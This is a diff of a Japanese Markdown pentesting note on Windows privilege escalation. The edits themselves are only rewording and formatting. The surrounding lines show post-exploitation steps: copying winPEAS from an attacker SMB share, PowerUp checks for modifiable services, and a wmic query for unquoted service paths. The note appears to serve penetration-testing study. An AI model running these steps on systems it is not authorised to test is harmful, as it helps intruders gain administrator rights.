@@ -72,7 +72,7 @@ cp \\<AttackerIP>\share\winPEASx64.exe .
 > - `Backup`：閲覧権限がないファイルでも復元できる権限をもつ可能性
 > - `Backup Operators`：組込みグループで、どのファイルでも復元できる特権をもつ
 > - `Helpdesk`：一般ユーザーに比べ何か特権を持っている可能性がある
-> - `Remote Desktop/Management`グループ：rdp/winrmで接続可能（
+> - `Remote Desktop/Management`グループ：rdp/winrmで接続可能（Administratorも可能）
 
 ## ユーザー情報・ホスト名の列挙コマンド
 
@@ -302,14 +302,14 @@ ps <search_word> -ErrorAction SilentlyContinue | Watch-Command -Difference -Cont
 ## 目的
 
 - 以下の条件を満たした権限昇格に利用可能なWindows サービスを特定する  
-	- 高権限（LocalSystem / 管理者権限）で実行されているサービス 
+	- 高権限（LocalSystem / 管理者権限）で実行されているもの
 	- サービスバイナリや設定が一般ユーザーにより変更可能なもの  
-	- Unquoted Service Path や非標準ディレクトリ実行のサービス
+	- Unquoted Service Path や非標準ディレクトリで実行のもの
 
 ## サービスの列挙コマンド
 
-[[用語#サービス]]
-[[💥Windows Privilege Escalation#Serviceを利用したPrivEsc]]
+- [[用語#サービス]]
+- [[💥Windows Privilege Escalation#Serviceを利用したPrivEsc]]
 
 実行中のサービス一覧を列挙
 ```powershell
@@ -331,7 +331,7 @@ Get-ModifiableService
 Get-ModifiableServiceFile
 ```
 
-[[💥Windows Privilege Escalation#Service Exploits - Unquoted Service Path]]用に、Windows標準フォルダ以外で実行されるサービス、かつ、バイナリがクオテーションで囲まれていないものを列挙
+[[💥Windows Privilege Escalation#Service Exploits - Unquoted Service Path]] 用に、Windows標準フォルダ以外で実行されるサービス、かつ、バイナリがクオテーションで囲まれていないものを列挙
 ```cmd
 # 最新環境ではwmicは使えない
 wmic service get Name, PathName, StartName |  findstr /i /v "C:\Windows\\" | findstr /i /v """
